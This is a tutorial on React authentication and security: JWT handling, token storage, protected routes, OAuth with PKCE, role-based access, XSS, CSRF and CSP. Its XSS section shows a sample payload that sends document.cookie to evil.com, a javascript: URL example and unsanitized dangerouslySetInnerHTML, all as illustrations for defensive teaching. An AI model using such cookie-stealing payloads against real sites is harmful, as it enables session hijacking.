# React Authentication and Security

## Table of Contents

- [1. Authentication Concepts](#1-authentication-concepts)
- [2. JWT Authentication Flow in React](#2-jwt-authentication-flow-in-react)
- [3. Storing Tokens](#3-storing-tokens)
- [4. Protected Routes with React Router v6](#4-protected-routes-with-react-router-v6)
- [5. Auth Context and Auth Provider Pattern](#5-auth-context-and-auth-provider-pattern)
- [6. Token Refresh Pattern](#6-token-refresh-pattern)
- [7. OAuth 2.0 and Social Login](#7-oauth-20-and-social-login)
- [8. Role-Based Access Control](#8-role-based-access-control)
- [9. React Security Vulnerabilities](#9-react-security-vulnerabilities)
- [10. Secure Form Handling](#10-secure-form-handling)
- [11. Environment Variables](#11-environment-variables)
- [12. HTTPS and Secure Cookies](#12-https-and-secure-cookies)
- [13. Common Auth Mistakes in React](#13-common-auth-mistakes-in-react)
- [14. Best Practices](#14-best-practices)

---

## 1. Authentication Concepts

---

### What is Authentication vs Authorization

**Authentication** — verifying *who* the user is (login, identity verification).

**Authorization** — verifying *what* the authenticated user is allowed to do (access control, permissions).

---

### Session-Based Authentication

The server creates a session record after login and gives the client a session ID (stored in a cookie).

```text
Client                    Server
  │── POST /login ──────>  │
  │                        │  Create session in DB
  │<── Set-Cookie: sessionId=abc ──│
  │                        │
  │── GET /profile ──────> │
  │   Cookie: sessionId=abc │
  │                        │  Look up session in DB
  │<── 200 OK ───────────  │
```

- Server stores session state (stateful)
- Session ID is opaque — has no meaning on its own
- Works well with server-rendered apps and same-domain cookies

---

### JWT — JSON Web Token

A JWT is a self-contained token encoding user claims, signed by the server.

```text
Structure: header.payload.signature

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
.eyJ1c2VySWQiOiIxMjMiLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3MDAwMDAwMDB9
.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

- Server does not store session state (stateless)
- Client sends token in every request header: `Authorization: Bearer <token>`
- Server verifies the signature — no DB lookup needed
- Expiry is embedded in the payload (`exp` claim)

---

### Cookies vs localStorage for Token Storage

| | localStorage | sessionStorage | httpOnly Cookie |
|---|---|---|---|
| Accessible from JS | Yes | Yes | No |
| XSS vulnerable | Yes | Yes | No |
| CSRF vulnerable | No | No | Yes (mitigated with SameSite) |
| Survives page reload | Yes | No | Yes |
| Sent automatically | No | No | Yes (same-origin) |
| Best for | Non-sensitive | Tab-scoped | Sensitive tokens |

---

### OAuth 2.0

OAuth 2.0 is an authorization protocol that lets users grant third-party applications access to their resources without sharing passwords.

Common flows in SPAs:
- **Authorization Code with PKCE** — most secure for public clients (React apps)
- **Implicit flow** — deprecated, insecure (token exposed in URL)

---

## 2. JWT Authentication Flow in React

---

### Complete Flow

```text
1. User submits login form
2. Client → POST /api/login { email, password }
3. Server validates credentials
4. Server creates JWT: { userId, role, exp }
5. Server signs JWT with secret key
6. Server → 200 { accessToken: "eyJ...", refreshToken: "eyJ..." }
7. Client stores accessToken (in memory or cookie)
8. Client stores refreshToken (in httpOnly cookie)
9. Client sends requests: Authorization: Bearer <accessToken>
10. Server verifies JWT signature → grants access
11. When accessToken expires → client uses refreshToken to get new accessToken
12. When refreshToken expires → user must log in again
```

---

### Login Implementation

```jsx
async function login(email, password) {
  const response = await fetch('/api/auth/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, password }),
    credentials: 'include', // send/receive cookies
  });

  if (!response.ok) {
    const error = await response.json();
    throw new Error(error.message);
  }

  const { accessToken } = await response.json();
  // Store accessToken in memory (most secure for SPAs)
  // refreshToken comes via httpOnly cookie automatically
  return accessToken;
}
```

---

### Attaching Token to Requests

```jsx
// Axios interceptor — automatically attaches token to every request
axios.interceptors.request.use(config => {
  const token = getAccessToken(); // read from memory/state
  if (token) {
    config.headers.Authorization = `Bearer ${token}`;
  }
  return config;
});

// Native fetch wrapper
async function authFetch(url, options = {}) {
  const token = getAccessToken();
  return fetch(url, {
    ...options,
    headers: {
      ...options.headers,
      Authorization: `Bearer ${token}`,
    },
    credentials: 'include',
  });
}
```

---

## 3. Storing Tokens

---

### In-Memory Storage (Most Secure for SPAs)

Store the access token in a JavaScript variable or React state/context:

```jsx
// In auth context
const [accessToken, setAccessToken] = useState(null);

// Pros: Not accessible to XSS attacks (no localStorage/sessionStorage)
// Cons: Lost on page refresh — requires silent refresh on load
```

---

### localStorage

```jsx
localStorage.setItem('accessToken', token);
const token = localStorage.getItem('accessToken');

// SECURITY RISK: Any JavaScript on the page can read localStorage.
// XSS attack: attacker injects script → reads token → sends to attacker server.
// Never store sensitive tokens in localStorage in production.
```

---

### httpOnly Cookie

```jsx
// Server sets the cookie — client has no JS access
res.cookie('refreshToken', token, {
  httpOnly: true,    // not accessible via document.cookie
  secure: true,      // HTTPS only
  sameSite: 'Strict', // no cross-site requests
  maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
});
```

```jsx
// Client cannot read the cookie value — but browser sends it automatically
// No manual token attachment needed for same-origin requests
```

---

### Recommended Pattern for React SPAs

```text
Access Token:  Store in memory (React state/context)
               Short expiry (15 minutes)
               Send via Authorization header

Refresh Token: Store in httpOnly cookie
               Long expiry (7 days)
               Used only to obtain new access token
               Never sent to general API endpoints
```

---

## 4. Protected Routes with React Router v6

---

### Basic Protected Route Component

```jsx
import { Navigate, Outlet } from 'react-router-dom';

function ProtectedRoute({ isAuthenticated, redirectTo = '/login' }) {
  if (!isAuthenticated) {
    return <Navigate to={redirectTo} replace />;
  }
  return <Outlet />;
}
```

---

### Route Configuration

```jsx
import { Routes, Route, Navigate } from 'react-router-dom';

function App() {
  const { isAuthenticated } = useAuth();

  return (
    <Routes>
      {/* Public routes */}
      <Route path="/login" element={<LoginPage />} />
      <Route path="/signup" element={<SignupPage />} />

      {/* Protected routes */}
      <Route element={<ProtectedRoute isAuthenticated={isAuthenticated} />}>
        <Route path="/dashboard" element={<Dashboard />} />
        <Route path="/profile" element={<Profile />} />
        <Route path="/settings" element={<Settings />} />
      </Route>

      {/* Redirect root to dashboard or login */}
      <Route
        path="/"
        element={
          isAuthenticated ? <Navigate to="/dashboard" replace /> : <Navigate to="/login" replace />
        }
      />
    </Routes>
  );
}
```

---

### Preserving Intended Destination

Redirect to the originally requested page after login:

```jsx
function ProtectedRoute({ isAuthenticated }) {
  const location = useLocation();

  if (!isAuthenticated) {
    // Save intended destination in location state
    return <Navigate to="/login" state={{ from: location }} replace />;
  }
  return <Outlet />;
}

function LoginPage() {
  const navigate = useNavigate();
  const location = useLocation();
  const from = location.state?.from?.pathname || '/dashboard';

  async function handleLogin(credentials) {
    await login(credentials);
    navigate(from, { replace: true }); // go to original destination
  }
}
```

---

### Loading State During Auth Check

```jsx
function ProtectedRoute({ isAuthenticated, isLoading }) {
  if (isLoading) {
    return <LoadingSpinner />; // avoid flash redirect during auth check
  }

  if (!isAuthenticated) {
    return <Navigate to="/login" replace />;
  }

  return <Outlet />;
}
```

This prevents a flash of the login page when the app is still checking if the user is authenticated (e.g., validating a stored token on page load).

---

## 5. Auth Context and Auth Provider Pattern

---

### Auth Context Setup

```jsx
import { createContext, useContext, useState, useEffect } from 'react';

const AuthContext = createContext(null);

export function AuthProvider({ children }) {
  const [user, setUser] = useState(null);
  const [accessToken, setAccessToken] = useState(null);
  const [isLoading, setIsLoading] = useState(true);

  // Check authentication on app load (silent refresh)
  useEffect(() => {
    async function initializeAuth() {
      try {
        // Attempt to get new access token using refresh token cookie
        const token = await refreshAccessToken();
        const userData = await fetchCurrentUser(token);
        setAccessToken(token);
        setUser(userData);
      } catch {
        // Not authenticated
        setUser(null);
        setAccessToken(null);
      } finally {
        setIsLoading(false);
      }
    }

    initializeAuth();
  }, []);

  async function login(email, password) {
    const { accessToken: token, user: userData } = await apiLogin(email, password);
    setAccessToken(token);
    setUser(userData);
  }

  async function logout() {
    await apiLogout(); // invalidate refresh token on server
    setUser(null);
    setAccessToken(null);
  }

  const value = {
    user,
    accessToken,
    isLoading,
    isAuthenticated: !!user,
    login,
    logout,
  };

  return (
    <AuthContext.Provider value={value}>
      {children}
    </AuthContext.Provider>
  );
}

export function useAuth() {
  const ctx = useContext(AuthContext);
  if (!ctx) throw new Error('useAuth must be used within AuthProvider');
  return ctx;
}
```

---

### Using Auth in Components

```jsx
function Navbar() {
  const { user, logout, isAuthenticated } = useAuth();

  return (
    <nav>
      {isAuthenticated ? (
        <>
          <span>Hello, {user.name}</span>
          <button onClick={logout}>Logout</button>
        </>
      ) : (
        <Link to="/login">Login</Link>
      )}
    </nav>
  );
}
```

---

## 6. Token Refresh Pattern

---

### Silent Refresh on App Load

```jsx
// On app startup, try to exchange refresh token for a new access token
// The refresh token is sent automatically via httpOnly cookie
async function refreshAccessToken() {
  const response = await fetch('/api/auth/refresh', {
    method: 'POST',
    credentials: 'include', // sends the httpOnly refresh token cookie
  });

  if (!response.ok) throw new Error('Refresh failed');

  const { accessToken } = await response.json();
  return accessToken;
}
```

---

### Axios Request Interceptor for Auto-Refresh

```jsx
let isRefreshing = false;
let failedQueue = [];

function processQueue(error, token = null) {
  failedQueue.forEach(prom => {
    if (error) prom.reject(error);
    else prom.resolve(token);
  });
  failedQueue = [];
}

axios.interceptors.response.use(
  response => response,
  async error => {
    const originalRequest = error.config;

    if (error.response?.status === 401 && !originalRequest._retry) {
      if (isRefreshing) {
        // Queue this request until refresh completes
        return new Promise((resolve, reject) => {
          failedQueue.push({ resolve, reject });
        }).then(token => {
          originalRequest.headers.Authorization = `Bearer ${token}`;
          return axios(originalRequest);
        });
      }

      originalRequest._retry = true;
      isRefreshing = true;

      try {
        const newToken = await refreshAccessToken();
        updateAccessToken(newToken); // update in-memory/state
        processQueue(null, newToken);
        originalRequest.headers.Authorization = `Bearer ${newToken}`;
        return axios(originalRequest);
      } catch (refreshError) {
        processQueue(refreshError, null);
        logout();
        return Promise.reject(refreshError);
      } finally {
        isRefreshing = false;
      }
    }

    return Promise.reject(error);
  }
);
```

This pattern: when a 401 is received, attempt refresh once. If multiple requests fail simultaneously, queue them and retry all after a single successful refresh.

---

## 7. OAuth 2.0 and Social Login

---

### Authorization Code Flow with PKCE

PKCE (Proof Key for Code Exchange) is the recommended OAuth flow for public clients (React SPAs) because there is no client secret to keep.

```text
1. User clicks "Login with Google"
2. App generates code_verifier (random string) and code_challenge (SHA256 hash of verifier)
3. App redirects to Google:
   GET https://accounts.google.com/o/oauth2/auth
     ?client_id=YOUR_CLIENT_ID
     &redirect_uri=https://yourapp.com/callback
     &response_type=code
     &scope=openid email profile
     &code_challenge=<hash>
     &code_challenge_method=S256
     &state=<random_nonce>

4. User logs in on Google
5. Google redirects back: /callback?code=AUTH_CODE&state=<nonce>
6. App verifies state (prevents CSRF)
7. App sends code + code_verifier to your backend
8. Backend exchanges code + verifier for tokens with Google
9. Backend returns your app's own JWT to the frontend
```

---

### Social Login Implementation

```jsx
function SocialLoginButton({ provider }) {
  function handleOAuthLogin() {
    const state = crypto.randomUUID(); // CSRF protection
    sessionStorage.setItem('oauth_state', state);

    const params = new URLSearchParams({
      client_id: import.meta.env.VITE_GOOGLE_CLIENT_ID,
      redirect_uri: `${window.location.origin}/auth/callback`,
      response_type: 'code',
      scope: 'openid email profile',
      state,
    });

    window.location.href = `https://accounts.google.com/o/oauth2/auth?${params}`;
  }

  return <button onClick={handleOAuthLogin}>Login with Google</button>;
}

// In the callback component
function AuthCallback() {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const { login } = useAuth();

  useEffect(() => {
    const code = searchParams.get('code');
    const state = searchParams.get('state');
    const savedState = sessionStorage.getItem('oauth_state');

    // Verify state to prevent CSRF
    if (state !== savedState) {
      navigate('/login?error=invalid_state');
      return;
    }

    // Exchange code for your app's session
    exchangeCodeForToken(code)
      .then(({ user, accessToken }) => {
        login(user, accessToken);
        navigate('/dashboard');
      })
      .catch(() => navigate('/login?error=oauth_failed'));
  }, []);

  return <LoadingSpinner />;
}
```

---

## 8. Role-Based Access Control

---

### RBAC Concepts

```text
User → has one or more Roles → each Role has a set of Permissions

Example:
  admin     → can: create, read, update, delete
  editor    → can: create, read, update
  viewer    → can: read
  guest     → cannot access protected routes
```

---

### Role Check in Protected Routes

```jsx
function RoleProtectedRoute({ allowedRoles }) {
  const { user, isAuthenticated, isLoading } = useAuth();

  if (isLoading) return <LoadingSpinner />;
  if (!isAuthenticated) return <Navigate to="/login" replace />;

  if (!allowedRoles.includes(user.role)) {
    return <Navigate to="/unauthorized" replace />;
  }

  return <Outlet />;
}

// Usage
<Routes>
  <Route element={<RoleProtectedRoute allowedRoles={['admin', 'editor']} />}>
    <Route path="/admin" element={<AdminPanel />} />
  </Route>
  <Route element={<RoleProtectedRoute allowedRoles={['admin']} />}>
    <Route path="/admin/users" element={<UserManagement />} />
  </Route>
</Routes>
```

---

### Permission-Based UI Elements

```jsx
function usePermission(permission) {
  const { user } = useAuth();
  return user?.permissions?.includes(permission) ?? false;
}

function PostActions({ post }) {
  const canEdit = usePermission('posts:edit');
  const canDelete = usePermission('posts:delete');

  return (
    <div>
      {canEdit && <button onClick={() => editPost(post.id)}>Edit</button>}
      {canDelete && <button onClick={() => deletePost(post.id)}>Delete</button>}
    </div>
  );
}
```

---

### Important Security Note

UI-level access control is **convenience only**. Never rely solely on frontend checks for security. The backend must validate permissions on every request independently of what the frontend shows or hides.

---

## 9. React Security Vulnerabilities

---

### XSS — Cross-Site Scripting

XSS attacks inject malicious scripts into a web page viewed by other users. React escapes all JSX expressions by default — this is a key security feature.

```jsx
const userInput = '<img src=x onerror="fetch(\'https://evil.com/?c=\'+document.cookie)">';

// Safe — React escapes the string, renders it as text
<p>{userInput}</p>
// Renders: <p>&lt;img src=x onerror=...&gt;</p>
```

---

### dangerouslySetInnerHTML

`dangerouslySetInnerHTML` bypasses React's automatic escaping. It is dangerous when used with user-controlled content:

```jsx
// DANGEROUS — executes attacker-controlled script
function Comment({ userHtml }) {
  return <div dangerouslySetInnerHTML={{ __html: userHtml }} />;
}
```

```jsx
// Safer — sanitize before rendering
import DOMPurify from 'dompurify';

function Comment({ userHtml }) {
  const sanitized = DOMPurify.sanitize(userHtml);
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}
```

DOMPurify removes dangerous elements and attributes while preserving safe HTML formatting.

---

### URL Injection (href XSS)

Attacker-controlled URLs can use `javascript:` scheme:

```jsx
const url = 'javascript:alert(document.cookie)';

// DANGEROUS — runs attacker script on click
<a href={url}>Click me</a>

// Safe — validate the URL scheme
function SafeLink({ href, children }) {
  const isAllowed = href.startsWith('http://') || href.startsWith('https://') || href.startsWith('/');
  if (!isAllowed) return <span>{children}</span>;
  return <a href={href}>{children}</a>;
}
```

---

### CSRF — Cross-Site Request Forgery

CSRF tricks a logged-in user's browser into making an unwanted request to your server.

**How it works:**
1. User is logged in to `bank.com`
2. Attacker sends an email with a link to `evil.com`
3. `evil.com` has a hidden form that submits to `bank.com/transfer`
4. The user's browser automatically sends the `bank.com` session cookie
5. Server receives a valid request from the authenticated user

**Mitigations:**
- Use `SameSite=Strict` or `SameSite=Lax` on cookies
- Validate CSRF tokens in form submissions
- Check `Origin` / `Referer` headers on server

```jsx
// httpOnly + SameSite cookie is resistant to CSRF
Set-Cookie: sessionId=abc; HttpOnly; Secure; SameSite=Strict
```

---

### Content Security Policy (CSP)

CSP is a browser security mechanism that restricts which resources a page can load. Set via HTTP header:

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.example.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
```

With a strict CSP, even if an attacker injects a script tag, the browser refuses to execute it because it's not in the allowed sources.

---

### Sensitive Data in State and localStorage

```jsx
// Wrong — password stored in state (visible in React DevTools)
const [user, setUser] = useState({ email, password });

// Wrong — JWT in localStorage (XSS accessible)
localStorage.setItem('token', jwt);

// Wrong — PAN card / credit card in React state
const [creditCard, setCreditCard] = useState(cardNumber);

// Correct — never store sensitive credentials in state
// Only store non-sensitive user metadata
const [user, setUser] = useState({ email, name, role });
```

---

## 10. Secure Form Handling

---

### Password Fields

```jsx
function LoginForm() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');

  return (
    <form onSubmit={handleSubmit} autoComplete="on">
      <input
        type="email"
        value={email}
        onChange={e => setEmail(e.target.value)}
        autoComplete="email"
        name="email"
      />
      <input
        type="password"
        value={password}
        onChange={e => setPassword(e.target.value)}
        autoComplete="current-password"
        name="password"
      />
      <button type="submit">Login</button>
    </form>
  );
}
```

Key points:
- `type="password"` — browser masks input, prevents autofill passwords appearing as plaintext
- `autoComplete="current-password"` — enables password manager integration
- Never log or store the password value anywhere on the client

---

### Clearing Sensitive State on Unmount

```jsx
function PaymentForm() {
  const [cardNumber, setCardNumber] = useState('');

  // Clear sensitive data when component unmounts
  useEffect(() => {
    return () => {
      setCardNumber(''); // clear from React state
    };
  }, []);
}
```

---

### Input Sanitization

```jsx
// For text that will be displayed as plain text — React handles escaping automatically
<p>{userInput}</p>

// For text that goes into an API — validate on the server, not just the client
// Never trust client-side validation alone for security decisions
```

---

## 11. Environment Variables

---

### Create React App (REACT_APP_ prefix)

```bash
# .env
REACT_APP_API_URL=https://api.example.com
REACT_APP_GOOGLE_CLIENT_ID=your_client_id

# CRITICAL: NEVER put secrets here
REACT_APP_DATABASE_PASSWORD=secret123  # WRONG — this is bundled into JS
```

```jsx
// Access in code
const apiUrl = process.env.REACT_APP_API_URL;
```

---

### Vite (VITE_ prefix)

```bash
# .env
VITE_API_URL=https://api.example.com
VITE_GOOGLE_CLIENT_ID=your_client_id
```

```jsx
const apiUrl = import.meta.env.VITE_API_URL;
```

---

### The Golden Rule

Any environment variable prefixed with `REACT_APP_` or `VITE_` is **bundled into the JavaScript that ships to users**. It is not secret. Anyone can open DevTools → Sources and read it.

```bash
# Variables that are SAFE to expose (public keys, endpoints):
VITE_API_URL=https://api.example.com
VITE_STRIPE_PUBLISHABLE_KEY=pk_live_...  # publishable = OK for client

# Variables that must NEVER be in frontend env:
STRIPE_SECRET_KEY=sk_live_...  # server-only
DATABASE_URL=postgresql://...  # server-only
JWT_SECRET=mysecret...         # server-only
AWS_ACCESS_KEY=AKIA...         # server-only
```

---

### .env Security

- Add `.env.local` and `.env.*.local` to `.gitignore`
- Use `.env.example` as a template (no real values) committed to git
- Store real secrets in the deployment platform's environment variable management

---

## 12. HTTPS and Secure Cookies

---

### Why HTTPS Matters for Auth

Without HTTPS:
- Tokens sent in headers can be intercepted (man-in-the-middle)
- Cookies without `Secure` flag can be stolen over HTTP
- Even `httpOnly` cookies are vulnerable without HTTPS

---

### Secure Cookie Attributes

```
Set-Cookie: token=abc;
  HttpOnly;              // JS cannot read — blocks XSS token theft
  Secure;               // Only sent over HTTPS
  SameSite=Strict;      // Not sent on cross-site requests — blocks CSRF
  Max-Age=604800;       // 7 days
  Path=/;
  Domain=yourapp.com
```

---

### SameSite Values

| Value | Behavior |
|---|---|
| `Strict` | Cookie never sent on cross-site requests (even navigating from another site) |
| `Lax` | Cookie sent on top-level navigations (e.g., clicking a link) but not on cross-site POST |
| `None` | Cookie always sent — requires `Secure` — used for third-party cookies |

---

## 13. Common Auth Mistakes in React

---

### Storing the Token in the Wrong Place

❌ Wrong

```jsx
// Accessible to XSS, persists indefinitely
localStorage.setItem('token', jwtToken);

// Anyone can read: localStorage.getItem('token')
```

✅ Better

```jsx
// In-memory — not accessible to XSS
const [token, setToken] = useState(null);

// Or httpOnly cookie (server sets it)
```

---

### No isLoading Guard in Protected Routes

❌ Wrong — Flash of login page before auth check completes

```jsx
function ProtectedRoute({ isAuthenticated }) {
  if (!isAuthenticated) return <Navigate to="/login" replace />;
  return <Outlet />;
}
```

✅ Correct

```jsx
function ProtectedRoute({ isAuthenticated, isLoading }) {
  if (isLoading) return <LoadingSpinner />;
  if (!isAuthenticated) return <Navigate to="/login" replace />;
  return <Outlet />;
}
```

---

### Trusting Frontend-Only Authorization

❌ Wrong

```jsx
// Client-side: hide the delete button for non-admins
{user.role === 'admin' && <DeleteButton />}

// Backend has no authorization check — anyone can call DELETE /posts/:id directly
```

✅ Correct — Also validate on backend

```js
// Server middleware
function requireRole(role) {
  return (req, res, next) => {
    if (req.user.role !== role) return res.status(403).json({ error: 'Forbidden' });
    next();
  };
}

router.delete('/posts/:id', requireRole('admin'), deletePost);
```

---

### Not Invalidating the Refresh Token on Logout

❌ Wrong

```jsx
async function logout() {
  setUser(null);
  setToken(null);
  // Refresh token cookie still valid on server!
  // Anyone who can read the cookie can get new access tokens
}
```

✅ Correct

```jsx
async function logout() {
  // Tell server to invalidate the refresh token
  await fetch('/api/auth/logout', { method: 'POST', credentials: 'include' });
  setUser(null);
  setToken(null);
}
```

---

## 14. Best Practices

---

### Auth Security Checklist

| Topic | Best Practice |
|---|---|
| Token storage | Access token in memory, refresh token in httpOnly cookie |
| Token expiry | Short-lived access tokens (15 min), longer refresh tokens (7 days) |
| HTTPS | Always use HTTPS in production, `Secure` cookie flag |
| Cookie security | `HttpOnly` + `Secure` + `SameSite=Strict` |
| XSS prevention | Never use `dangerouslySetInnerHTML` with unsanitized input |
| CSRF protection | `SameSite=Strict` cookies, CSRF tokens for state-changing requests |
| Environment vars | Never put secrets in `REACT_APP_` or `VITE_` variables |
| Backend validation | Always validate auth and permissions on the server |
| Logout | Invalidate refresh token on the server, clear client state |
| OAuth | Use Authorization Code + PKCE, verify `state` parameter |
| CSP | Configure Content Security Policy headers |
| Passwords | Use `type="password"`, enable password manager autocomplete |

---

### Keeping the Auth Layer Thin

The auth context should only contain auth-related state: `user`, `isAuthenticated`, `isLoading`, `login`, `logout`. Do not mix unrelated application state into the auth provider.

---

### Defense in Depth

Security is layered. No single mechanism is sufficient:

```text
Layer 1: HTTPS encrypts transport
Layer 2: httpOnly cookies prevent JS token access
Layer 3: SameSite=Strict prevents CSRF
Layer 4: CSP prevents script injection
Layer 5: Input sanitization prevents XSS
Layer 6: Backend authorization validates every request
Layer 7: Short token expiry limits damage from theft
Layer 8: Token rotation invalidates stolen refresh tokens
```

Each layer provides independent protection. An attacker must defeat all of them.
